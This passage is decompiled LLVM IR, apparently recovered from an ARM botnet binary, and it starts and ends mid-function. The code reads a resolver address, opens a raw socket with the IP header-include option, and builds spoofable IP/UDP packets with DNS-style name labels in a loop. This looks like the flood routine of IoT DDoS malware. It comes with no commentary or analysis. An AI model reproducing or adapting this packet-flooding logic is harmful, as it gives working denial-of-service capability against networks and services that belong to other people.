  %v4_c364 = call i32 @util_stristr(i8* %v3_c364, i32 %v0_c358, i32 %v3_c354)
  store i32 %v4_c364, i32* @r6, align 4
  store i32 24, i32* %r0.global-to-local, align 4
  %v1_c370 = call i32 @table_lock_val(i32 24)
  store i32 %v1_c370, i32* %r0.global-to-local, align 4
  %v0_c374 = load i32, i32* @r6, align 4
  %v7_c374 = icmp eq i32 %v0_c374, -1
  store i1 %v7_c374, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c374, label %dec_label_pc_c814, label %dec_label_pc_c37c

dec_label_pc_c37c:                                ; preds = %dec_label_pc_c320
  %v0_c37c = load i32, i32* @r5, align 4
  %v9_c37c = icmp eq i32 %v0_c37c, %v0_c374
  store i1 %v9_c37c, i1* %cpsr_z.global-to-local, align 1
  %v7_c380 = icmp sgt i32 %v0_c37c, %v0_c374
  br i1 %v7_c380, label %dec_label_pc_c384, label %dec_label_pc_c814

dec_label_pc_c384:                                ; preds = %dec_label_pc_c37c
  %v0_c384 = load i32, i32* @sl, align 4
  %v2_c384 = add i32 %v0_c384, %v0_c374
  store i32 %v2_c384, i32* %r1.global-to-local, align 4
  store i32 %v0_c374, i32* %r2.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_c3b0 = add i32 %v0_c37c, -1
  br label %dec_label_pc_c3a8

dec_label_pc_c394:                                ; preds = %dec_label_pc_c3d0, %bb104
  %v9_c394 = icmp eq i32 %v1_c3b0, %v0_c39c
  store i1 %v9_c394, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c394, label %dec_label_pc_c3e0, label %dec_label_pc_c39c

dec_label_pc_c39c:                                ; preds = %dec_label_pc_c3c0, %dec_label_pc_c394, %bb
  %v0_c3cc29 = phi i32 [ %v0_c3cc, %dec_label_pc_c3c0 ], [ %v0_c3cc30, %dec_label_pc_c394 ], [ %v0_c3cc, %bb ]
  %v0_c3ac25 = phi i32 [ 0, %dec_label_pc_c3c0 ], [ %v0_c3ac26, %dec_label_pc_c394 ], [ 0, %bb ]
  %v1_c39c = add i32 %v0_c39c, 1
  store i32 %v1_c39c, i32* %r2.global-to-local, align 4
  %v9_c3a0 = icmp eq i32 %v1_c39c, %v0_c37c
  store i1 %v9_c3a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c3a0, label %dec_label_pc_c814, label %dec_label_pc_c3a8

dec_label_pc_c3a8:                                ; preds = %dec_label_pc_c39c, %dec_label_pc_c384
  %v0_c39c = phi i32 [ %v1_c39c, %dec_label_pc_c39c ], [ %v0_c374, %dec_label_pc_c384 ]
  %v0_c3cc = phi i32 [ %v0_c3cc29, %dec_label_pc_c39c ], [ 0, %dec_label_pc_c384 ]
  %v0_c3ac = phi i32 [ %v0_c3ac25, %dec_label_pc_c39c ], [ 0, %dec_label_pc_c384 ]
  %v0_c3b4 = phi i32 [ %v1_c3b4, %dec_label_pc_c39c ], [ %v2_c384, %dec_label_pc_c384 ]
  %v1_c3a8 = inttoptr i32 %v0_c3b4 to i8*
  %v2_c3a8 = load i8, i8* %v1_c3a8, align 1
  %v3_c3a8 = zext i8 %v2_c3a8 to i32
  store i32 %v3_c3a8, i32* %r3.global-to-local, align 4
  %v2_c3ac = icmp eq i32 %v0_c3ac, 0
  store i1 %v2_c3ac, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c3b0, i32* @r4, align 4
  %v1_c3b4 = add i32 %v0_c3b4, 1
  store i32 %v1_c3b4, i32* %r1.global-to-local, align 4
  %v1_c3b8 = add nsw i32 %v3_c3a8, -48
  store i32 %v1_c3b8, i32* %r0.global-to-local, align 4
  br i1 %v2_c3ac, label %dec_label_pc_c3c0, label %dec_label_pc_c3d0

dec_label_pc_c3c0:                                ; preds = %dec_label_pc_c3a8
  %v7_c3c0 = icmp eq i8 %v2_c3a8, 9
  store i1 %v7_c3c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c3c0, label %dec_label_pc_c39c, label %bb

bb:                                               ; preds = %dec_label_pc_c3c0
  %v8_c3c4 = icmp eq i8 %v2_c3a8, 32
  store i1 %v8_c3c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_c3c4, label %dec_label_pc_c39c, label %dec_label_pc_c3cc

dec_label_pc_c3cc:                                ; preds = %bb
  %v1_c3cc = add i32 %v0_c3cc, 1
  store i32 %v1_c3cc, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_c3d0

dec_label_pc_c3d0:                                ; preds = %dec_label_pc_c3a8, %dec_label_pc_c3cc
  %v0_c3cc30 = phi i32 [ %v0_c3cc, %dec_label_pc_c3a8 ], [ %v1_c3cc, %dec_label_pc_c3cc ]
  %v0_c3ac26 = phi i32 [ %v0_c3ac, %dec_label_pc_c3a8 ], [ %v1_c3cc, %dec_label_pc_c3cc ]
  %v7_c3d0 = icmp eq i8 %v2_c3a8, 46
  store i1 %v7_c3d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c3d0, label %dec_label_pc_c394, label %bb104

bb104:                                            ; preds = %dec_label_pc_c3d0
  %v8_c3d4 = icmp eq i32 %v1_c3b8, 9
  store i1 %v8_c3d4, i1* %cpsr_z.global-to-local, align 1
  %tmp = icmp ult i32 %v1_c3b8, 10
  br i1 %tmp, label %dec_label_pc_c394, label %dec_label_pc_c3dc

dec_label_pc_c3dc:                                ; preds = %bb104
  br label %dec_label_pc_c3e0

dec_label_pc_c3e0:                                ; preds = %dec_label_pc_c394, %dec_label_pc_c3dc
  %v0_c39c127 = phi i32 [ %v0_c39c, %dec_label_pc_c3dc ], [ %v1_c3b0, %dec_label_pc_c394 ]
  %v2_c3e4 = sub i32 %v0_c39c127, %v0_c374
  store i32 %v2_c3e4, i32* @r4, align 4
  %v2_c3e8 = ptrtoint i32* %stack_var_-76 to i32
  store i32 %v2_c384, i32* %r1.global-to-local, align 4
  store i32 %v2_c3e8, i32* %r0.global-to-local, align 4
  store i32 %v2_c3e4, i32* %r2.global-to-local, align 4
  %v3_c3f8 = call i32 @util_memcpy(i32 %v2_c3e8, i32 %v2_c384, i32 %v2_c3e4)
  %v2_c3fc = ptrtoint i32* %stack_var_-40 to i32
  %v1_c400 = load i32, i32* @r4, align 4
  %v2_c400 = add i32 %v1_c400, %v2_c3fc
  store i32 %v2_c400, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_c3e8, i32* @r0, align 4
  %v3_c40c = add i32 %v2_c400, -36
  %v4_c40c = inttoptr i32 %v3_c40c to i8*
  store i8 0, i8* %v4_c40c, align 1
  %v1_c410 = call i32 @inet_addr(i32 %v2_c3e8)
  store i32 %v1_c410, i32* %r0.global-to-local, align 4
  store i32 %v1_c410, i32* @fp, align 4
  br label %dec_label_pc_c418

dec_label_pc_c4189:                               ; preds = %dec_label_pc_c814
  unreachable

dec_label_pc_c418:                                ; preds = %dec_label_pc_c874, %dec_label_pc_c86c, %dec_label_pc_c860, %dec_label_pc_c850, %dec_label_pc_c3e0
  %v1_c84c50 = phi i32 [ %v1_c818, %dec_label_pc_c874 ], [ %v1_c818, %dec_label_pc_c86c ], [ %v1_c818, %dec_label_pc_c860 ], [ %v1_c818, %dec_label_pc_c850 ], [ %v1_c410, %dec_label_pc_c3e0 ]
  %v0_c418 = load i32, i32* @r7, align 4
  %v2_c418 = icmp eq i32 %v0_c418, 0
  store i1 %v2_c418, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c418, label %dec_label_pc_c840, label %dec_label_pc_c420

dec_label_pc_c420:                                ; preds = %dec_label_pc_c418
  store i32 %v0_c418, i32* %r0.global-to-local, align 4
  %v1_c424 = inttoptr i32 %v0_c418 to i8*
  %v2_c424 = call i32 @util_strlen(i8* %v1_c424)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 %v2_c424, i32* @r6, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_c438 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_c438, i32* %r0.global-to-local, align 4
  %v7_c43c = icmp eq i32 %v3_c438, -1
  store i1 %v7_c43c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c43c, label %dec_label_pc_c840, label %dec_label_pc_c448

dec_label_pc_c448:                                ; preds = %dec_label_pc_c420
  store i32 1, i32* %stack_var_-44, align 4
  %v6_c450 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_c450, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_c464 = call i32 @__GI_setsockopt(i32 %v3_c438, i32 0, i32 3, i32 %v6_c450, i32 4)
  store i32 %v5_c464, i32* %r0.global-to-local, align 4
  %v7_c468 = icmp eq i32 %v5_c464, -1
  store i1 %v7_c468, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c468, label %dec_label_pc_c838, label %dec_label_pc_c470

dec_label_pc_c470:                                ; preds = %dec_label_pc_c448
  %v0_c478 = load i32, i32* %sb.global-to-local, align 4
  %v1_c478 = urem i32 %v0_c478, 256
  store i32 %v1_c478, i32* %sb.global-to-local, align 4
  %v3_c480 = mul i32 %v6_c284, 65536
  store i32 %v3_c480, i32* %r3.global-to-local, align 4
  %v5_c48c = trunc i32 %v0_c478 to i8
  %v0_c490 = load i32, i32* @r8, align 4
  %v2_c490 = icmp eq i32 %v0_c490, 0
  store i1 %v2_c490, i1* %cpsr_z.global-to-local, align 1
  %v3_c494 = urem i32 %v7_c228, 65536
  store i32 %v3_c494, i32* %r0.global-to-local, align 4
  %v3_c49c = urem i32 %v6_c284, 65536
  store i32 %v3_c49c, i32* %r2.global-to-local, align 4
  %v3_c4a0 = mul i32 %v6_c29c, 65536
  %v3_c4a4 = mul i32 %v6_c2b8, 65536
  store i32 %v3_c4a4, i32* %ip.global-to-local, align 4
  br i1 %v2_c490, label %bb105, label %bb106

bb105:                                            ; preds = %dec_label_pc_c470
  %v5_c4ac = sext i8 %v5_c48c to i32
  store i32 %v5_c4ac, i32* %r2.global-to-local, align 4
  br label %bb106

bb106:                                            ; preds = %dec_label_pc_c470, %bb105
  %v2_c4d8 = phi i32 [ %v3_c49c, %dec_label_pc_c470 ], [ %v5_c4ac, %bb105 ]
  %v3_c4b8 = urem i32 %v6_c29c, 65536
  store i32 %v3_c4b8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v3_c4c0 = urem i32 %v6_c2b8, 65536
  store i32 0, i32* %stack_var_-44, align 4
  %v1_c4d8 = load i32, i32* @r6, align 4
  br i1 %v2_c490, label %.dec_label_pc_c6c0.preheader_crit_edge, label %dec_label_pc_c4e0

.dec_label_pc_c6c0.preheader_crit_edge:           ; preds = %bb106
  %v3_c4d8 = add i32 %v1_c4d8, %v2_c4d8
  store i32 %v3_c4d8, i32* @r7, align 4
  %.pre = sext i8 %v5_c48c to i32
  br label %dec_label_pc_c6c0.preheader

dec_label_pc_c4e0:                                ; preds = %bb106
  %v2_c4e0 = add i32 %v1_c4d8, %v1_c478
  %v3_c4e4 = mul i32 %v2_c4e0, 65536
  %v1_c4ec = add i32 %v3_c4e4, 1769472
  %v1_c4f0 = add i32 %v3_c4e4, 3080192
  %tmp107 = udiv i32 %v1_c4f0, 256
  %v3_c504 = and i32 %tmp107, 65280
  %v4_c514 = udiv i32 %v1_c4f0, 16777216
  %v5_c514 = or i32 %v3_c504, %v4_c514
  store i32 %v5_c514, i32* @sl, align 4
  %trunc61 = trunc i32 %v6_c284 to i16
  %rev = call i16 @llvm.bswap.i16(i16 %trunc61)
  %tmp108 = mul i32 %v7_c228, 256
  %v3_c528 = and i32 %tmp108, 65280
  store i32 %v3_c528, i32* %r1.global-to-local, align 4
  %tmp109 = udiv i32 %v7_c228, 256
  %v4_c52c = urem i32 %tmp109, 256
  %v5_c52c = or i32 %v4_c52c, %v3_c528
  store i32 %v5_c52c, i32* @sb, align 4
  store i32 %v3_c4a4, i32* %r2.global-to-local, align 4
  store i32 %v3_c4a0, i32* %r0.global-to-local, align 4
  %tmp110 = mul i32 %v6_c29c, 256
  %v3_c540 = and i32 %tmp110, 65280
  %tmp111 = mul i32 %v6_c2b8, 256
  %v3_c544 = and i32 %tmp111, 65280
  %tmp112 = udiv i32 %v1_c4ec, 256
  %v3_c548 = and i32 %tmp112, 65280
  store i32 %v3_c548, i32* @lr, align 4
  %tmp113 = udiv i32 %v6_c29c, 256
  %v4_c54c = urem i32 %tmp113, 256
  %v5_c54c = or i32 %v4_c54c, %v3_c540
  store i32 %v5_c54c, i32* %ip.global-to-local, align 4
  %tmp114 = udiv i32 %v6_c2b8, 256
  %v4_c550 = urem i32 %tmp114, 256
  %v5_c550 = or i32 %v4_c550, %v3_c544
  store i32 %v5_c550, i32* @r4, align 4
  %v1_c554 = add i32 %v1_c4d8, 1
  store i32 %v1_c554, i32* %r3.global-to-local, align 4
  %v4_c558 = udiv i32 %v1_c4ec, 16777216
  %v5_c558 = or i32 %v4_c558, %tmp112
  store i32 0, i32* @r5, align 4
  %v4_c5dc = sext i8 %v5_c48c to i32
  %sext = mul nuw i32 %v5_c54c, 65536
  %v7_c5f0 = sdiv i32 %sext, 65536
  %sext8 = mul nuw i32 %v5_c550, 65536
  %v4_c618 = sdiv i32 %sext8, 65536
  %v1_c5b8 = trunc i32 %v5_c228 to i8
  %extract.t = trunc i32 %v5_c260 to i8
  %v1_c5e0 = add nsw i32 %v4_c5dc, 41
  %sext121 = mul i32 %v5_c558, 65536
  %v3_c5f0 = sdiv i32 %sext121, 65536
  br label %dec_label_pc_c570

dec_label_pc_c570:                                ; preds = %dec_label_pc_c690, %dec_label_pc_c4e0
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 600, i32* %r0.global-to-local, align 4
  %v2_c578 = call i32 @calloc(i32 600, i32 1)
  store i32 %v2_c578, i32* %r0.global-to-local, align 4
  store i32 %v2_c1ec, i32* %ip.global-to-local, align 4
  %v3_c580 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c580, i32* %r3.global-to-local, align 4
  %v2_c584 = load i32, i32* @r5, align 4
  %v5_c584 = mul i32 %v2_c584, 4
  %v6_c584 = add i32 %v5_c584, %v2_c1ec
  %v7_c584 = inttoptr i32 %v6_c584 to i32*
  store i32 %v2_c578, i32* %v7_c584, align 4
  %v0_c588 = load i32, i32* %ip.global-to-local, align 4
  %v1_c588 = load i32, i32* %r3.global-to-local, align 4
  %v4_c588 = mul i32 %v1_c588, 4
  %v5_c588 = add i32 %v4_c588, %v0_c588
  %v6_c588 = inttoptr i32 %v5_c588 to i32*
  %v7_c588 = load i32, i32* %v6_c588, align 4
  store i32 %v7_c588, i32* %r1.global-to-local, align 4
  %v1_c58c = inttoptr i32 %v7_c588 to i8*
  %v2_c58c = load i8, i8* %v1_c58c, align 1
  %tmp132 = urem i8 %v2_c58c, 16
  %v1_c590 = zext i8 %tmp132 to i32
  %v1_c594 = or i32 %v1_c590, 64
  store i32 %v1_c594, i32* %r2.global-to-local, align 4
  %v1_c598 = trunc i32 %v1_c594 to i8
  store i8 %v1_c598, i8* %v1_c58c, align 1
  %v0_c59c = load i32, i32* %r1.global-to-local, align 4
  %v1_c59c = inttoptr i32 %v0_c59c to i8*
  %v2_c59c = load i8, i8* %v1_c59c, align 1
  %v3_c59c = zext i8 %v2_c59c to i32
  %v1_c5a0 = and i32 %v3_c59c, 240
  %v1_c5a4 = or i32 %v1_c5a0, 5
  store i32 %v1_c5a4, i32* %r3.global-to-local, align 4
  store i32 %v1_c26c, i32* %lr.global-to-local, align 4
  %v1_c5ac = trunc i32 %v1_c5a4 to i8
  store i8 %v1_c5ac, i8* %v1_c59c, align 1
  store i32 %v5_c228, i32* %r0.global-to-local, align 4
  %v0_c5b4 = load i32, i32* %lr.global-to-local, align 4
  %v2_c5b4 = icmp eq i32 %v0_c5b4, 0
  store i1 %v2_c5b4, i1* %cpsr_z.global-to-local, align 1
  %v2_c5b8 = load i32, i32* %r1.global-to-local, align 4
  %v3_c5b8 = add i32 %v2_c5b8, 1
  %v4_c5b8 = inttoptr i32 %v3_c5b8 to i8*
  store i8 %v1_c5b8, i8* %v4_c5b8, align 1
  store i32 %v5_c260, i32* %r2.global-to-local, align 4
  %v0_c5c0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c5c0, label %.thread11, label %bb115

bb115:                                            ; preds = %dec_label_pc_c570
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_c5c4 = load i32, i32* %r1.global-to-local, align 4
  %v4_c5c4 = add i32 %v3_c5c4, 6
  %v5_c5c4 = inttoptr i32 %v4_c5c4 to i16*
  store i16 64, i16* %v5_c5c4, align 2
  %v0_c5cc.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t53 = trunc i32 %v0_c5cc.pre to i8
  br label %.thread11

.thread11:                                        ; preds = %dec_label_pc_c570, %bb115
  %v0_c5cc.off0 = phi i8 [ %extract.t, %dec_label_pc_c570 ], [ %extract.t53, %bb115 ]
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_c5cc = load i32, i32* %r1.global-to-local, align 4
  %v3_c5cc = add i32 %v2_c5cc, 8
  %v4_c5cc = inttoptr i32 %v3_c5cc to i8*
  store i8 %v0_c5cc.off0, i8* %v4_c5cc, align 1
  %v0_c5d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_c5d0 = trunc i32 %v0_c5d0 to i8
  %v2_c5d0 = load i32, i32* %r1.global-to-local, align 4
  %v3_c5d0 = add i32 %v2_c5d0, 9
  %v4_c5d0 = inttoptr i32 %v3_c5d0 to i8*
  store i8 %v1_c5d0, i8* %v4_c5d0, align 1
  %v2_c5d8 = load i32, i32* @global_var_24a4c.59, align 4
  %v0_c5e0 = load i32, i32* %r1.global-to-local, align 4
  %v2_c5e4 = add i32 %v1_c5e0, %v0_c5e0
  store i32 %v2_c5e4, i32* @r4, align 4
  %v2_c5e8 = add i32 %v0_c5e0, 12
  %v3_c5e8 = inttoptr i32 %v2_c5e8 to i32*
  store i32 %v2_c5d8, i32* %v3_c5e8, align 4
  store i32 %v3_c5f0, i32* %r2.global-to-local, align 4
  store i32 %v7_c5f0, i32* %r3.global-to-local, align 4
  %v0_c5f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_c5f4 = add i32 %v0_c5f4, 20
  store i32 %v1_c5f4, i32* %ip.global-to-local, align 4
  %v0_c5f8 = load i32, i32* @sl, align 4
  %v1_c5f8 = trunc i32 %v0_c5f8 to i16
  %v3_c5f8 = add i32 %v0_c5f4, 2
  %v4_c5f8 = inttoptr i32 %v3_c5f8 to i16*
  store i16 %v1_c5f8, i16* %v4_c5f8, align 2
  %v0_c5fc = load i32, i32* @sb, align 4
  %v1_c5fc = trunc i32 %v0_c5fc to i16
  %v2_c5fc = load i32, i32* %r1.global-to-local, align 4
  %v3_c5fc = add i32 %v2_c5fc, 4
  %v4_c5fc = inttoptr i32 %v3_c5fc to i16*
  store i16 %v1_c5fc, i16* %v4_c5fc, align 2
  %v0_c600 = load i32, i32* %r2.global-to-local, align 4
  %v1_c600 = trunc i32 %v0_c600 to i16
  %v2_c600 = load i32, i32* %ip.global-to-local, align 4
  %v3_c600 = add i32 %v2_c600, 4
  %v4_c600 = inttoptr i32 %v3_c600 to i16*
  store i16 %v1_c600, i16* %v4_c600, align 2
  %v0_c604 = load i32, i32* %r3.global-to-local, align 4
  %v1_c604 = trunc i32 %v0_c604 to i16
  %v2_c604 = load i32, i32* %ip.global-to-local, align 4
  %v3_c604 = add i32 %v2_c604, 2
  %v4_c604 = inttoptr i32 %v3_c604 to i16*
  store i16 %v1_c604, i16* %v4_c604, align 2
  %v2_c60c = load i32, i32* %r1.global-to-local, align 4
  %v3_c60c = add i32 %v2_c60c, 20
  %v4_c60c = inttoptr i32 %v3_c60c to i16*
  store i16 %rev, i16* %v4_c60c, align 2
  store i32 %v4_c5dc, i32* %ip.global-to-local, align 4
  %v0_c614 = load i32, i32* %r1.global-to-local, align 4
  %v1_c614 = add i32 %v0_c614, 28
  store i32 %v1_c614, i32* %r0.global-to-local, align 4
  store i32 %v4_c618, i32* %r3.global-to-local, align 4
  store i32 256, i32* @lr, align 4
  %v3_c624 = add i32 %v0_c614, 30
  %v4_c624 = inttoptr i32 %v3_c624 to i16*
  store i16 1, i16* %v4_c624, align 2
  %v0_c628 = load i32, i32* @lr, align 4
  %v1_c628 = trunc i32 %v0_c628 to i16
  %v2_c628 = load i32, i32* %r0.global-to-local, align 4
  %v3_c628 = add i32 %v2_c628, 4
  %v4_c628 = inttoptr i32 %v3_c628 to i16*
  store i16 %v1_c628, i16* %v4_c628, align 2
  %v0_c62c = load i32, i32* %ip.global-to-local, align 4
  %v1_c62c = trunc i32 %v0_c62c to i8
  %v2_c62c = load i32, i32* %r1.global-to-local, align 4
  %v3_c62c = add i32 %v2_c62c, 40
  %v4_c62c = inttoptr i32 %v3_c62c to i8*
  store i8 %v1_c62c, i8* %v4_c62c, align 1
  %v0_c630 = load i32, i32* @fp, align 4
  %v1_c630 = load i32, i32* %r1.global-to-local, align 4
  %v2_c630 = add i32 %v1_c630, 16
  %v3_c630 = inttoptr i32 %v2_c630 to i32*
  store i32 %v0_c630, i32* %v3_c630, align 4
  %v0_c634 = load i32, i32* %r3.global-to-local, align 4
  %v1_c634 = trunc i32 %v0_c634 to i16
  %v2_c634 = load i32, i32* %r1.global-to-local, align 4
  %v3_c634 = add i32 %v2_c634, 28
  %v4_c634 = inttoptr i32 %v3_c634 to i16*
  store i16 %v1_c634, i16* %v4_c634, align 2
  %v0_c638 = load i32, i32* @r4, align 4
  %v1_c638 = add i32 %v0_c638, 1
  store i32 %v1_c638, i32* %r0.global-to-local, align 4
  %v0_c63c = load i32, i32* @r7, align 4
  store i32 %v0_c63c, i32* %r1.global-to-local, align 4
  store i32 %v1_c554, i32* %r2.global-to-local, align 4
  %v3_c644 = call i32 @util_memcpy(i32 %v1_c638, i32 %v0_c63c, i32 %v1_c554)
  store i32 %v3_c644, i32* %r0.global-to-local, align 4
  %v0_c648 = load i32, i32* @r6, align 4
  %v2_c648 = icmp eq i32 %v0_c648, 0
  store i1 %v2_c648, i1* %cpsr_z.global-to-local, align 1
  %tmp116 = icmp slt i32 %v0_c648, 1
  br i1 %tmp116, label %bb117, label %dec_label_pc_c658

bb117:                                            ; preds = %.thread11
  %v5_c64c = load i32, i32* @r4, align 4
  store i32 %v5_c64c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_c690

dec_label_pc_c658:                                ; preds = %.thread11
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_c65c = load i32, i32* @r4, align 4
  store i32 %v0_c65c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_c664

dec_label_pc_c664:                                ; preds = %.thread18, %dec_label_pc_c658
  %v0_c670 = phi i32 [ %storemerge, %.thread18 ], [ 0, %dec_label_pc_c658 ]
  %v0_c674 = phi i32 [ %v0_c688, %.thread18 ], [ 0, %dec_label_pc_c658 ]
  %v1_c664 = load i32, i32* @r7, align 4
  %v2_c664 = add i32 %v1_c664, %v0_c674
  %v3_c664 = inttoptr i32 %v2_c664 to i8*
  %v4_c664 = load i8, i8* %v3_c664, align 1
  %v6_c664 = zext i8 %v4_c664 to i32
  store i32 %v6_c664, i32* %r3.global-to-local, align 4
  %v7_c668 = icmp eq i8 %v4_c664, 46
  store i1 %v7_c668, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c668, label %bb118, label %.thread60

.thread60:                                        ; preds = %dec_label_pc_c664
  %v1_c67014 = add nsw i32 %v0_c670, 1
  store i32 %v1_c67014, i32* %r2.global-to-local, align 4
  %v1_c67416 = add i32 %v0_c674, 1
  store i32 %v1_c67416, i32* %r1.global-to-local, align 4
  br label %bb119

bb118:                                            ; preds = %dec_label_pc_c664
  %v2_c66c = load i32, i32* @r4, align 4
  %v3_c66c = add i32 %v2_c66c, %v0_c674
  store i32 %v3_c66c, i32* %r3.global-to-local, align 4
  %v1_c670 = add nsw i32 %v0_c670, 1
  store i32 %v1_c670, i32* %r2.global-to-local, align 4
  %v1_c674 = add i32 %v0_c674, 1
  store i32 %v1_c674, i32* %r1.global-to-local, align 4
  %v2_c678 = trunc i32 %v0_c670 to i8
  %v3_c678 = load i32, i32* %r0.global-to-local, align 4
  %v4_c678 = inttoptr i32 %v3_c678 to i8*
  store i8 %v2_c678, i8* %v4_c678, align 1
  %v0_c67c.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c67c.pre, label %bb120, label %bb118.bb119_crit_edge

bb118.bb119_crit_edge:                            ; preds = %bb118
  %v1_c67c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb119

bb119:                                            ; preds = %bb118.bb119_crit_edge, %.thread60
  %v1_c67c = phi i32 [ %v1_c67c.pre, %bb118.bb119_crit_edge ], [ %v1_c67014, %.thread60 ]
  %v2_c67c = urem i32 %v1_c67c, 256
  br label %.thread18

bb120:                                            ; preds = %bb118
  %v1_c680 = load i32, i32* %r3.global-to-local, align 4
  %v2_c680 = add i32 %v1_c680, 1
  store i32 %v2_c680, i32* %r0.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb119, %bb120
  %storemerge = phi i32 [ %v2_c67c, %bb119 ], [ 0, %bb120 ]
  store i32 %storemerge, i32* %ip.global-to-local, align 4
  %v0_c688 = load i32, i32* %r1.global-to-local, align 4
  %v1_c688 = load i32, i32* @r6, align 4
  %v9_c688 = icmp eq i32 %v0_c688, %v1_c688
  store i1 %v9_c688, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c688, label %dec_label_pc_c690.loopexit, label %dec_label_pc_c664

dec_label_pc_c690.loopexit:                       ; preds = %.thread18
  %v2_c690.pre = load i32, i32* %r0.global-to-local, align 4
  %extract.t131 = trunc i32 %storemerge to i8
  br label %dec_label_pc_c690

dec_label_pc_c690:                                ; preds = %bb117, %dec_label_pc_c690.loopexit
  %v0_c690.off0 = phi i8 [ %extract.t131, %dec_label_pc_c690.loopexit ], [ 0, %bb117 ]
  %v2_c690 = phi i32 [ %v2_c690.pre, %dec_label_pc_c690.loopexit ], [ %v5_c64c, %bb117 ]
  %v3_c690 = inttoptr i32 %v2_c690 to i8*
  store i8 %v0_c690.off0, i8* %v3_c690, align 1
  %v3_c694 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c694, i32* %r3.global-to-local, align 4
  %v1_c698 = add i32 %v3_c694, 1
  store i32 %v1_c698, i32* @r5, align 4
  %v0_c69c = load i32, i32* @r4, align 4
  %v1_c69c = load i32, i32* @r6, align 4
  %v2_c69c = add i32 %v1_c69c, %v0_c69c
  store i32 %v2_c69c, i32* %r2.global-to-local, align 4
  store i32 256, i32* @lr, align 4
  %v0_c6a4 = load i32, i32* @r8, align 4
  %v9_c6a4 = icmp eq i32 %v0_c6a4, %v1_c698
  store i1 %v9_c6a4, i1* %cpsr_z.global-to-local, align 1
  %v3_c6a8 = add i32 %v2_c69c, 4
  %v4_c6a8 = inttoptr i32 %v3_c6a8 to i16*
  store i16 256, i16* %v4_c6a8, align 2
  %v0_c6ac = load i32, i32* @lr, align 4
  %v1_c6ac = trunc i32 %v0_c6ac to i16
  %v2_c6ac = load i32, i32* %r2.global-to-local, align 4
  %v3_c6ac = add i32 %v2_c6ac, 2
  %v4_c6ac = inttoptr i32 %v3_c6ac to i16*
  store i16 %v1_c6ac, i16* %v4_c6ac, align 2
  %v0_c6b0 = load i32, i32* @r5, align 4
  store i32 %v0_c6b0, i32* %stack_var_-44, align 4
  %v8_c6b4 = icmp sgt i32 %v0_c6a4, %v1_c698
  br i1 %v8_c6b4, label %dec_label_pc_c570, label %dec_label_pc_c6b8

dec_label_pc_c6b8:                                ; preds = %dec_label_pc_c690
  store i32 %v4_c5dc, i32* %r0.global-to-local, align 4
  %v0_c6bc = load i32, i32* @r6, align 4
  %v2_c6bc = add i32 %v0_c6bc, %v4_c5dc
  store i32 %v2_c6bc, i32* @r7, align 4
  %v0_c6c4.pre.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_c6c0.preheader

dec_label_pc_c6c0.preheader:                      ; preds = %.dec_label_pc_c6c0.preheader_crit_edge, %dec_label_pc_c6b8
  %v4_c724.pre-phi = phi i32 [ %.pre, %.dec_label_pc_c6c0.preheader_crit_edge ], [ %v4_c5dc, %dec_label_pc_c6b8 ]
  %v0_c6c4.pre = phi i32 [ 0, %.dec_label_pc_c6c0.preheader_crit_edge ], [ %v0_c6c4.pre.pre, %dec_label_pc_c6b8 ]
  %v3_c6f0 = icmp eq i32 %v3_c494, 65535
  %v3_c700 = icmp eq i32 %v3_c49c, 65535
  br label %dec_label_pc_c6c0

dec_label_pc_c6c0:                                ; preds = %dec_label_pc_c6c0, %dec_label_pc_c7b8, %dec_label_pc_c6c0.preheader
  %v0_c6c4 = phi i32 [ %v0_c6c4.pre, %dec_label_pc_c6c0.preheader ], [ 0, %dec_label_pc_c7b8 ], [ 0, %dec_label_pc_c6c0 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c6c4 = icmp eq i32 %v0_c6c4, 0
  store i1 %v2_c6c4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c6c4, label %dec_label_pc_c6c0, label %dec_label_pc_c6d0

dec_label_pc_c6d0:                                ; preds = %dec_label_pc_c6c0, %dec_label_pc_c7b8
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_c6d4 = load i32, i32* @r7, align 4
  %v1_c6d4 = add i32 %v0_c6d4, 27
